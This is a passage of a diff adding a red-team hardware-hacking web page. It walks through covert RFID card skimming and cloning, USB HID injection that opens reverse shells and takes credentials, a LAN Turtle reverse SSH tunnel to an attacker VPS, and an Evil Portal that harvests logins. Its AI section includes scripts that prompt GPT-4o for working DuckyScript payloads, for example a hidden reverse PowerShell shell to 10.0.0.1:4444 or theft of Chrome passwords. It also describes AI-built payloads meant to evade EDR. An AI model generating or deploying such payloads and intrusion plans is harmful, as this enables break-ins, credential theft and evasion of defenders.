+        <div class="flow-desc">Position a Proxmark3 RDV4 with long-range LF antenna in a briefcase or laptop bag near a target employee (lift, reception, coffee queue). The antenna captures HID Prox or MIFARE card data at 15-30cm range without any visible indicator to the target. The entire read takes 0.5 seconds. Return to the vehicle, clone the card to a T5577 blank, and present the cloned card to door readers for entry. MIFARE cards require a second pass near the reader (using the Proxmark3 in emulation mode if cloning fails).</div>
+        <div class="flow-device">&#128308; Device: Proxmark3 RDV4 + Long-Range Antenna + T5577 blank cards</div>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-num">03</div>
+      <div class="flow-body">
+        <div class="flow-title">INITIAL FOOTHOLD -- HID INJECTION</div>
+        <div class="flow-desc">Inside the facility, locate an unattended workstation (conference room, hot-desk, printer station). Insert a USB Rubber Ducky or plug in an O.MG Cable in place of the existing charging cable. The Ducky injects a payload in under 3 seconds -- establishing a reverse shell, dropping a persistence mechanism, or exfiltrating credentials. The O.MG Cable continues to provide wireless payload delivery after you leave the area, allowing injection from the car park hours later.</div>
+        <div class="flow-device">&#128308; Devices: USB Rubber Ducky &bull; O.MG Cable &bull; Flipper Zero BadUSB</div>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-num">04</div>
+      <div class="flow-body">
+        <div class="flow-title">PERSISTENT NETWORK ACCESS</div>
+        <div class="flow-desc">Plug a LAN Turtle into an available Ethernet port -- conference room tables, behind printers, in server rooms, or in IT closets. The LAN Turtle establishes an outbound AutoSSH reverse tunnel to an attacker-controlled VPS. Once active, the operator has persistent SSH access to the internal network from anywhere in the world, routed through the VPS, bypassing all perimeter controls. The LAN Turtle will maintain this tunnel indefinitely unless physically removed -- typical deployments persist for weeks in assessments.</div>
+        <div class="flow-device">&#128308; Device: LAN Turtle &bull; VPS running SSH server</div>
+      </div>
+    </div>
+    <div class="flow-step">
+      <div class="flow-num">05</div>
+      <div class="flow-body">
+        <div class="flow-title">WIRELESS CREDENTIAL HARVEST</div>
+        <div class="flow-desc">Deploy the Wi-Fi Pineapple in a concealed location (under a conference table, in a planted backpack) powered by a USB-C powerbank. Enable PineAP KARMA mode and an Evil Portal cloning the organisation's VPN or Office 365 login page. Employee laptops and phones probing for remembered networks auto-associate. Credentials entered in the Evil Portal are captured in real time. Simultaneously run Responder on the Pineapple to capture NTLM hashes from Windows clients. The Bash Bunny on any accessed workstation runs Responder via USB Ethernet for a second credential capture vector.</div>
+        <div class="flow-device">&#128308; Devices: Wi-Fi Pineapple &bull; Bash Bunny &bull; Wireless Adapter</div>
+      </div>
+    </div>
+  </div>
+  </div>
+</section>
+<div class="div div-ai"></div>
+
+<!-- 08 AI INTEGRATION -->
+<section class="sec rv sec-ai" id="ai">
+  <div class="sec-hd"><span class="sec-n">08 //</span><h2 class="sec-t">AI Integration in Hardware Hacking Operations<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+  <div class="panel panel-ai rv-l">
+    <p>AI accelerates hardware red team operations by generating device-specific payloads on demand, analysing captured traffic for credentials and sensitive data, recommending attack chains based on discovered infrastructure, and converting raw hardware assessment findings into professional report sections. For DuckyScript payload development specifically, AI produces working, OS-detected, targeted payloads in seconds -- work that previously required template selection, manual adaptation, and testing. The operational cycle from "I have physical access" to "payload deployed" shrinks from 30 minutes to under 2 minutes with AI assistance.</p>
+  </div>
+  <div class="alert al-p rv">
+    <span class="al-ic">[ AI ]</span>
+    <p class="al-tx">Red team operators using AI-assisted hardware payload development report 80% faster payload generation for Rubber Ducky, O.MG Cable, and Bash Bunny operations. AI generates OS-targeted payloads, handles encoding, adapts timing for different target environments, and produces the complete DuckyScript in under 60 seconds from a plain-English operational requirement.</p>
+  </div>
+  <div class="ai-grid rv">
+    <div class="ai-card"><span class="ai-ico">&#128736;&#65039;</span><div class="ai-name">DuckyScript Generation</div><div class="ai-desc">AI generates targeted DuckyScript payloads from operational requirements -- "generate a DuckyScript for Windows 11 that opens a hidden PowerShell window, establishes a reverse shell to 10.0.0.1:4444, and then clears PowerShell history to reduce forensic artifacts." Produces working DuckyScript 3.0 syntax with correct timing, key combinations, and ATTACKMODE declarations for specific Hak5 device models. Adapts for Windows, macOS, and Linux targets automatically.</div></div>
+    <div class="ai-card"><span class="ai-ico">&#128202;</span><div class="ai-name">Captured Traffic Analysis</div><div class="ai-desc">AI analyses Wireshark PCAP files captured via Wi-Fi Pineapple, LAN Turtle, or Bash Bunny Responder to extract credentials, identify cleartext protocols, map internal network topology from DNS queries, and surface high-value targets for lateral movement. Converts a raw packet capture into a structured intelligence report identifying every exploitable finding without manual packet-by-packet analysis.</div></div>
+    <div class="ai-card"><span class="ai-ico">&#127919;</span><div class="ai-name">Attack Chain Planning</div><div class="ai-desc">Given a facility reconnaissance report -- card type identified (MIFARE Classic), SSIDs discovered (corporate WPA2-Enterprise), hardware port in lobby -- AI recommends the optimal attack chain with specific device deployments, timing, and sequencing. "Use Proxmark3 for card clone during morning rush, deploy LAN Turtle in conference room at 10am, use O.MG Cable at unattended workstation at 11am, exfiltrate via LAN Turtle SSH tunnel." Structured, specific, operationally relevant.</div></div>
+    <div class="ai-card"><span class="ai-ico">&#128196;</span><div class="ai-name">Report Generation</div><div class="ai-desc">AI converts hardware red team assessment findings into professional report sections with timeline reconstruction, CVSSv4.0 scoring for physical attack paths, business impact statements, and remediation recommendations specific to each device attack demonstrated -- RFID access control upgrade guidance, USB port blocking policy, wireless security controls, network port access control. Produces evidence-backed findings that drive remediation budget approval.</div></div>
+    <div class="ai-card"><span class="ai-ico">&#128270;</span><div class="ai-name">RFID Data Analysis</div><div class="ai-desc">AI analyses Proxmark3 card dump files and autopwn output -- decoding facility codes from HID Prox card data, identifying card numbering patterns to predict unissued card IDs for brute force, explaining MIFARE Classic sector structure and access conditions from raw hex dumps, and documenting the cryptographic weaknesses exploited (CRYPTO1, darkside attack) in terms appropriate for both technical and management audiences.</div></div>
+    <div class="ai-card"><span class="ai-ico">&#9889;</span><div class="ai-name">Payload Evasion</div><div class="ai-desc">AI generates evasion-optimised payloads that bypass endpoint security controls activated by HID injection detection -- using legitimate system binaries (LOLBins), splitting payloads across multiple keystrokes with variable timing to defeat timing-based HID injection detection, encoding payloads to avoid string-based EDR triggers, and using scheduled tasks rather than direct execution to delay EDR alerting past the USB removal window.</div></div>
+  </div>
+  <div class="panel panel-ai rv" style="margin-top:28px">
+    <div class="panel-t">AI Tools for Hardware Red Team Operations</div>
+    <table class="ptbl">
+      <thead><tr>
+        <th style="color:#bf00ff;border-bottom-color:rgba(191,0,255,.25)">Tool</th>
+        <th style="color:#bf00ff;border-bottom-color:rgba(191,0,255,.25)">Capability</th>
+        <th style="color:#bf00ff;border-bottom-color:rgba(191,0,255,.25)">Hardware Use Case</th>
+      </tr></thead>
+      <tbody>
+        <tr><td style="color:var(--g)">GPT-4 / Claude</td><td style="color:var(--t2)">Payload generation, traffic analysis, reporting</td><td style="color:var(--t2)">DuckyScript payloads; PCAP analysis; RFID data decode; report sections</td></tr>
+        <tr><td style="color:var(--g)">PayloadStudio AI</td><td style="color:var(--t2)">Hak5 native payload assistant</td><td style="color:var(--t2)">AI-assisted DuckyScript 3.0 in Hak5 official IDE</td></tr>
+        <tr><td style="color:var(--g)">Python + OpenAI</td><td style="color:var(--t2)">Automated payload pipeline</td><td style="color:var(--t2)">Generate, encode, and deploy payloads to Hak5 devices programmatically</td></tr>
+        <tr><td style="color:var(--g)">Wireshark + AI</td><td style="color:var(--t2)">PCAP analysis + credential extraction</td><td style="color:var(--t2)">TShark extracts data; GPT analyses for credentials and sensitive content</td></tr>
+        <tr><td style="color:var(--g)">GitHub Copilot</td><td style="color:var(--t2)">Bash Bunny payload scripting</td><td style="color:var(--t2)">Autocomplete Bash Bunny payload.sh scripts with LED, ATTACKMODE, module calls</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="cb cb-ai rv" data-l="AI Pipeline -- DuckyScript Generator from Operational Brief">
+    <code><span style="color:#bd93f9">#!/usr/bin/env python3</span>
+<span style="color:var(--t3)"># Generate targeted DuckyScript payloads using GPT from operational requirements
+# Usage: python3 ducky_gen.py "Windows 11, exfil Chrome passwords, C2 10.0.0.1"</span>
+
+<span style="color:#bd93f9">import</span> openai, sys
+
+<span style="color:#8be9fd">def</span> <span style="color:var(--c)">generate_ducky</span>(brief, device=<span style="color:#ff79c6">"USB Rubber Ducky Gen3"</span>):
+    prompt = (
+        <span style="color:#ff79c6">f"You are an expert red team operator writing authorised penetration test payloads. "
+        f"Generate a complete, working DuckyScript payload for {device}. "
+        "Use DuckyScript 3.0 syntax (VAR, IF/ELSE, ATTACKMODE). "
+        "Include: correct DELAY timing, appropriate ATTACKMODE declaration, "
+        "evasion-aware approach (minimise console windows, clear history). "
+        "Return ONLY the DuckyScript code, no explanation.
+
+"
+        f"Operational brief: {brief}"</span>
+    )
+    r = openai.OpenAI().chat.completions.create(
+        model=<span style="color:#ff79c6">"gpt-4o"</span>,
+        messages=[{<span style="color:#ff79c6">"role"</span>:<span style="color:#ff79c6">"user"</span>,<span style="color:#ff79c6">"content"</span>:prompt}],
+        temperature=0.15
+    )
+    <span style="color:#bd93f9">return</span> r.choices[0].message.content.strip()
+
+brief  = <span style="color:#ff79c6">" "</span>.join(sys.argv[1:]) <span style="color:#bd93f9">if</span> len(sys.argv) > 1 <span style="color:#bd93f9">else</span>          <span style="color:#ff79c6">"Windows 11, reverse PowerShell shell to 10.0.0.1:4444, no console window"</span>
+device = <span style="color:#ff79c6">"USB Rubber Ducky Gen3"</span>
+
+payload = generate_ducky(brief, device)
+fname   = <span style="color:#ff79c6">"payload.txt"</span>
+<span style="color:#bd93f9">with</span> open(fname, <span style="color:#ff79c6">"w"</span>) <span style="color:#bd93f9">as</span> f: f.write(payload)
+print(<span style="color:#ff79c6">f"[+] Payload saved to {fname}"</span>)
+print(<span style="color:#ff79c6">f"[*] Copy to SD card and deploy on {device}"</span>)
+print()
+print(payload)</code>
+  </div>
+  <div class="cb cb-ai rv" data-l="AI -- Proxmark3 Dump Decoder + RFID Recon Report">
+    <code><span style="color:#bd93f9">#!/usr/bin/env python3</span>
+<span style="color:var(--t3)"># Parse Proxmark3 autopwn output and generate RFID recon intelligence report
+# Usage: python3 rfid_ai.py pm3_output.txt</span>
+
+<span style="color:#bd93f9">import</span> openai, sys, re
+
+<span style="color:#8be9fd">def</span> <span style="color:var(--c)">parse_pm3_output</span>(filepath):
+    <span style="color:#bd93f9">with</span> open(filepath) <span style="color:#bd93f9">as</span> f:
+        raw = f.read()
+    findings = {
+        <span style="color:#ff79c6">"card_type"</span>  : re.search(r<span style="color:#ff79c6">"(MIFARE|HID|iCLASS|EM\d+|NTAG\d+)[^
+]*"</span>, raw),
+        <span style="color:#ff79c6">"uid"</span>        : re.search(r<span style="color:#ff79c6">"UID\s*[:\|]\s*([0-9A-Fa-f\s]+)"</span>, raw),
+        <span style="color:#ff79c6">"keys_found"</span> : len(re.findall(r<span style="color:#ff79c6">"Key\s+(A|B)\s*[:\|]\s*[0-9A-Fa-f]+"</span>, raw)),
+        <span style="color:#ff79c6">"sectors"</span>    : len(re.findall(r<span style="color:#ff79c6">"sector\s+\d+"</span>, raw, re.I)),
+        <span style="color:#ff79c6">"hid_fc"</span>     : re.search(r<span style="color:#ff79c6">"Facility Code\s*[:\|]\s*(\d+)"</span>, raw),
+        <span style="color:#ff79c6">"hid_card"</span>   : re.search(r<span style="color:#ff79c6">"Card Number\s*[:\|]\s*(\d+)"</span>, raw),
+        <span style="color:#ff79c6">"raw_snippet"</span>: raw[:3000]
+    }
+    <span style="color:#bd93f9">return</span> {k: (v.group(0) <span style="color:#bd93f9">if</span> hasattr(v,<span style="color:#ff79c6">"group"</span>) <span style="color:#bd93f9">else</span> v) <span style="color:#bd93f9">for</span> k,v <span style="color:#bd93f9">in</span> findings.items()}
+
+<span style="color:#8be9fd">def</span> <span style="color:var(--c)">ai_rfid_report</span>(findings):
+    prompt = (
+        <span style="color:#ff79c6">"You are a senior physical penetration tester analysing RFID card data from a Proxmark3. "
+        "Based on the findings below, provide:
+"
+        "1. CARD IDENTIFICATION -- type, security level, known vulnerabilities
+"
+        "2. FACILITY CODE ANALYSIS -- if HID, what does the facility code tell us?
+"
+        "3. ATTACK IMPACT -- what access was obtained or could be obtained?
+"
+        "4. CLONE PROCEDURE -- exact Proxmark3 commands to clone this card type
+"
+        "5. REMEDIATION -- specific recommendations for this card system
+
+"
+        "Findings:
+"</span> + str(findings)
+    )
+    r = openai.OpenAI().chat.completions.create(
+        model=<span style="color:#ff79c6">"gpt-4o"</span>,
+        messages=[{<span style="color:#ff79c6">"role"</span>:<span style="color:#ff79c6">"user"</span>,<span style="color:#ff79c6">"content"</span>:prompt}]
+    )
+    <span style="color:#bd93f9">return</span> r.choices[0].message.content
+
+filepath = sys.argv[1] <span style="color:#bd93f9">if</span> len(sys.argv) > 1 <span style="color:#bd93f9">else</span> <span style="color:#ff79c6">"pm3_output.txt"</span>
+findings = parse_pm3_output(filepath)
+print(<span style="color:#ff79c6">f"[*] Card: {findings.get('card_type','Unknown')}"</span>)
+print(<span style="color:#ff79c6">f"[*] Keys recovered: {findings.get('keys_found',0)}"</span>)
+print()
+print(ai_rfid_report(findings))</code>
+  </div>
+</section>
+
+<div class="cta rv">
+  <div class="cta-t">// The right device opens every door. //</div>
+  <p class="cta-p">Hardware hacking devices give red team operators capabilities that no software tool can replicate -- physical-layer access, hardware-trusted USB HID, wireless MITM infrastructure, and cryptographically broken RFID systems. Master this arsenal, understand what each device exposes in your clients' environments, and use AI to deploy them faster and report them more compellingly. The gap between a secured facility and a breached one is often a $170 Flipper Zero and the knowledge of how to use it.</p>
+  <div class="cta-btns">
+    <a href="https://github.com/nishu2402" class="btn btn-p" target="_blank" rel="noopener">GitHub -- nishu2402</a>
+    <a href="https://nishu2402.github.io" class="btn btn-s" target="_blank" rel="noopener">View Portfolio</a>
+  </div>
+</div>
+<footer class="footer">
+  <div class="f-l">Nisarg Chasmawala (Shroff)<br><span class="f-alias">// HEAVEN</span></div>
+  <div class="f-r">Offensive Security Engineer &middot; MSc Cyber Security, BCU<br>CEH Master &middot; CPENT &middot; CHFI &middot; ISO 27001 Lead Auditor<br><a href="https://github.com/nishu2402" target="_blank" rel="noopener">github.com/nishu2402</a></div>
+</footer>
+</div>
+<script>
+var cur=document.getElementById('cur'),cur2=document.getElementById('cur2'),cur3=document.getElementById('cur3');
+var mx=0,my=0;
+document.addEventListener('mousemove',function(e){mx=e.clientX;my=e.clientY;cur.style.left=mx+'px';cur.style.top=my+'px';});
+(function loop(){cur2.style.left=mx+'px';cur2.style.top=my+'px';cur3.style.left=mx+'px';cur3.style.top=my+'px';requestAnimationFrame(loop);})();
+document.querySelectorAll('a,.btn,.ai-card,.panel,.cb,.tc,.dev-card').forEach(function(el){
+  el.addEventListener('mouseenter',function(){cur.style.width='18px';cur.style.height='18px';cur.style.background='rgba(0,255,65,.25)';});
+  el.addEventListener('mouseleave',function(){cur.style.width='10px';cur.style.height='10px';cur.style.background='var(--g)';});
+});
+window.addEventListener('scroll',function(){document.getElementById('prog').style.width=((window.scrollY/(document.body.scrollHeight-window.innerHeight))*100)+'%';});
+(function(){
+  var c=document.getElementById('bg-particle'),ctx=c.getContext('2d');
+  var W,H,mX=innerWidth/2,mY=innerHeight/2,N=200,MAX=140,P=[];
+  function Pt(){this.reset(true);}
+  Pt.prototype.reset=function(i){this.x=Math.random()*W;this.y=i?Math.random()*H:H+10;this.z=Math.random()*3+.5;this.vx=(Math.random()-.5)*.4;this.vy=(Math.random()-.5)*.4-.1;this.life=Math.random()*300+200;this.maxLife=this.life;this.r=Math.random()*1.5+.5;var r=Math.random();this.color=r<.7?'0,255,65':r<.9?'0,229,255':'191,0,255';};
+  Pt.prototype.update=function(){var dx=this.x-mX,dy=this.y-mY,d=Math.sqrt(dx*dx+dy*dy);if(d<120){var f=(120-d)/120;this.vx+=dx/d*f*.6;this.vy+=dy/d*f*.6;}this.vx*=.98;this.vy*=.98;this.x+=this.vx;this.y+=this.vy;this.life--;if(this.life<=0||this.x<-50||this.x>W+50||this.y<-50||this.y>H+50)this.reset(false);};
+  Pt.prototype.draw=function(){var a=(this.life/this.maxLife)*.7*this.z;ctx.beginPath();ctx.arc(this.x,this.y,this.r*this.z,0,Math.PI*2);ctx.fillStyle='rgba('+this.color+','+a+')';ctx.fill();};
+  function resize(){W=c.width=innerWidth;H=c.height=innerHeight;}
+  function lines(){for(var i=0;i<P.length;i++){for(var j=i+1;j<P.length;j++){var a=P[i],b=P[j],dx=a.x-b.x,dy=a.y-b.y,d=Math.sqrt(dx*dx+dy*dy);if(d<MAX){var al=(1-d/MAX)*.18,g=ctx.createLinearGradient(a.x,a.y,b.x,b.y);g.addColorStop(0,'rgba('+a.color+','+al+')');g.addColorStop(1,'rgba('+b.color+','+al+')');ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);ctx.strokeStyle=g;ctx.lineWidth=(a.z+b.z)/2*.5;ctx.stroke();}}}}
+  function animate(){ctx.clearRect(0,0,W,H);var g=ctx.createRadialGradient(mX,mY,0,mX,mY,80);g.addColorStop(0,'rgba(0,255,65,0)');g.addColorStop(.7,'rgba(0,255,65,0.04)');g.addColorStop(1,'rgba(0,255,65,0)');ctx.fillStyle=g;ctx.beginPath();ctx.arc(mX,mY,80,0,Math.PI*2);ctx.fill();lines();P.forEach(function(p){p.update();p.draw();});requestAnimationFrame(animate);}
+  resize();window.addEventListener('resize',resize);document.addEventListener('mousemove',function(e){mX=e.clientX;mY=e.clientY;});
+  for(var i=0;i<N;i++)P.push(new Pt());animate();
+})();
+(function(){
+  var c=document.getElementById('bg-hex'),ctx=c.getContext('2d');
+  var W,H,t=0,S=40;
+  function resize(){W=c.width=innerWidth;H=c.height=innerHeight;}
+  function hex(cx,cy,s){ctx.beginPath();for(var i=0;i<6;i++){var a=Math.PI/180*(60*i-30);if(i===0)ctx.moveTo(cx+s*Math.cos(a),cy+s*Math.sin(a));else ctx.lineTo(cx+s*Math.cos(a),cy+s*Math.sin(a));}ctx.closePath();}
+  function draw(){ctx.clearRect(0,0,W,H);t+=.008;var sy=window.scrollY,cols=Math.ceil(W/(S*1.732))+2,rows=Math.ceil(H/(S*1.5))+2;for(var r=-1;r<rows;r++){for(var col=-1;col<cols;col++){var cx=col*S*1.732+(r%2)*S*.866,cy=r*S*1.5-(sy*.03)%(S*1.5),w=Math.sin(t+col*.3+r*.2)*.5+.5;hex(cx,cy,S-2);ctx.strokeStyle='rgba(0,255,65,'+(0.02+w*0.07)+')';ctx.lineWidth=.6;ctx.stroke();if(w>.92){hex(cx,cy,S-2);ctx.fillStyle='rgba(0,255,65,'+(0.02+w*0.03)+')';ctx.fill();}}}requestAnimationFrame(draw);}
+  resize();window.addEventListener('resize',resize);draw();
+})();
+// HERO: HARDWARE DEVICE ORBIT RING
+// 9 hacking devices orbit around a central "PAYLOAD" core node, each labelled
+(function(){
+  var c=document.getElementById('hero-geo');if(!c)return;
+  var ctx=c.getContext('2d'),SZ=420;c.width=SZ;c.height=SZ;
+  var t=0,mrx=0,mry=0;
+  document.addEventListener('mousemove',function(e){mrx=(e.clientY/innerHeight-.5)*.1;mry=(e.clientX/innerWidth-.5)*.1;});
+  var CX=SZ/2,CY=SZ/2;
+
+  var devices=[
+    {label:'FLIPPER',   sub:'Zero',     col:'0,255,65',   angle:0},
+    {label:'DUCKY',     sub:'USB',      col:'255,200,80',  angle:Math.PI*2/9},
+    {label:'O.MG',      sub:'Cable',    col:'255,80,80',   angle:Math.PI*4/9},
+    {label:'BASH',      sub:'Bunny',    col:'191,0,255',   angle:Math.PI*6/9},
+    {label:'PINEAPPLE', sub:'Wi-Fi',    col:'0,229,255',   angle:Math.PI*8/9},
+    {label:'LAN',       sub:'Turtle',   col:'0,255,65',    angle:Math.PI*10/9},
+    {label:'PROXMARK',  sub:'RDV4',     col:'255,200,80',  angle:Math.PI*12/9},
+    {label:'ALFA',      sub:'Adapter',  col:'0,229,255',   angle:Math.PI*14/9},
+    {label:'BAD',       sub:'USB',      col:'255,80,80',   angle:Math.PI*16/9},
+  ];
+
+  var R1=130, R2=155;  // inner/outer orbit radii
+
+  function draw(){
+    ctx.clearRect(0,0,SZ,SZ);
+    t+=0.012;
+    ctx.save();ctx.translate(mrx*12,mry*10);
+
+    // Orbit rings
+    ctx.beginPath();ctx.arc(CX,CY,R1,0,Math.PI*2);
+    ctx.strokeStyle='rgba(0,255,65,0.08)';ctx.lineWidth=1;ctx.stroke();
+
+    // Device nodes orbiting
+    devices.forEach(function(d,i){
+      var a=d.angle+t*(i%2===0?0.4:-0.35);
+      var px=CX+R1*Math.cos(a),py=CY+R1*Math.sin(a);
+      var pulse=Math.sin(t*2+i*0.7)*.35+.65;
+
+      // Glow
+      var ng=ctx.createRadialGradient(px,py,0,px,py,20);
+      ng.addColorStop(0,'rgba('+d.col+','+pulse*0.3+')');ng.addColorStop(1,'rgba('+d.col+',0)');
+      ctx.fillStyle=ng;ctx.beginPath();ctx.arc(px,py,20,0,Math.PI*2);ctx.fill();
+
+      // Core dot
+      ctx.beginPath();ctx.arc(px,py,7,0,Math.PI*2);
+      ctx.fillStyle='rgba(3,5,9,0.92)';ctx.fill();
+      ctx.strokeStyle='rgba('+d.col+','+pulse*0.9+')';ctx.lineWidth=1.5;ctx.stroke();
+
+      // Label
+      var lx=px+(px<CX?-14:14);
+      ctx.font='bold 8px Orbitron,sans-serif';
+      ctx.fillStyle='rgba('+d.col+','+pulse*0.9+')';
+      ctx.textAlign=px<CX?'right':'left';ctx.textBaseline='middle';
+      ctx.fillText(d.label,lx,py-5);
+      ctx.font='7px Share Tech Mono';
+      ctx.fillStyle='rgba('+d.col+',0.55)';
+      ctx.fillText(d.sub,lx,py+5);
+
+      // Line from centre
+      ctx.beginPath();ctx.moveTo(CX,CY);ctx.lineTo(px,py);
+      ctx.strokeStyle='rgba('+d.col+',0.05)';ctx.lineWidth=1;ctx.stroke();
+    });
+
+    // Central node
+    var cp=Math.sin(t*1.5)*.4+.6;
+    var cg=ctx.createRadialGradient(CX,CY,0,CX,CY,36);
+    cg.addColorStop(0,'rgba(0,255,65,'+(0.3+cp*0.15)+')');
+    cg.addColorStop(.6,'rgba(0,229,255,0.06)');cg.addColorStop(1,'rgba(0,255,65,0)');
+    ctx.fillStyle=cg;ctx.beginPath();ctx.arc(CX,CY,36,0,Math.PI*2);ctx.fill();
+    ctx.beginPath();ctx.arc(CX,CY,22,0,Math.PI*2);
+    ctx.fillStyle='rgba(3,5,9,0.95)';ctx.fill();
+    ctx.strokeStyle='rgba(0,255,65,'+(0.5+cp*0.4)+')';ctx.lineWidth=2;ctx.stroke();
+    ctx.font='bold 9px Orbitron,sans-serif';
+    ctx.fillStyle='rgba(0,255,65,'+(0.7+cp*0.3)+')';
+    ctx.textAlign='center';ctx.textBaseline='middle';
+    ctx.fillText('PAYLOAD',CX,CY);
+
+    ctx.restore();
+    requestAnimationFrame(draw);
+  }
+  draw();
+})();
+var rv=new IntersectionObserver(function(e){e.forEach(function(x){if(x.isIntersecting)x.target.classList.add('on');});},{threshold:.08});
+document.querySelectorAll('.rv,.rv-l').forEach(function(el){rv.observe(el);});
+var sIds=['hero','overview','flipper','usb','hak5','wifi','rfid','workflows','ai'];
+var tItems=document.querySelectorAll('.toc-i');
+function updateTOC(){
+  var sy=window.scrollY+120,cur='hero';
+  sIds.forEach(function(id){var el=document.getElementById(id);if(el&&el.offsetTop<=sy)cur=id;});
+  tItems.forEach(function(ti){ti.classList.toggle('active',ti.dataset.s===cur);});
+}
+window.addEventListener('scroll',updateTOC,{passive:true});
+updateTOC();
+function goTo(h){document.querySelector(h).scrollIntoView({behavior:'smooth'});}
+document.querySelectorAll('.cb').forEach(function(b){
+  b.title='Click to copy';
+  b.addEventListener('click',function(){
+    navigator.clipboard.writeText(b.querySelector('code').innerText).catch(function(){});
+    var o=b.getAttribute('data-l');b.setAttribute('data-l',o+' \u2713 COPIED');
+    setTimeout(function(){b.setAttribute('data-l',o);},2000);
+  });
+});
+</script>
+</body>
+</html>
